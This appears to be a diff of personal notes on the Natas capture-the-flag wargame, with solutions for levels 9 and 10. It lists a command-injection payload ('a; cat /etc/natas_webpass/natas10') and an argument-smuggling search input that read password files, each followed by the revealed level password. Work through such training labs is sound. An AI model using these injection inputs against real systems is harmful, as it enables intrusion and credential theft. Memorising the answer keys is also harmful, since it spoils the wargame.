@@ -42,3 +42,13 @@
 * W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 # Natas9
+* Injection vulnerability
+* a; cat /etc/natas_webpass/natas10
+* nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+# Natas10
+* input "1 /etc/natas_webpass/natas11" into search query
+* U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+# Natas11
+
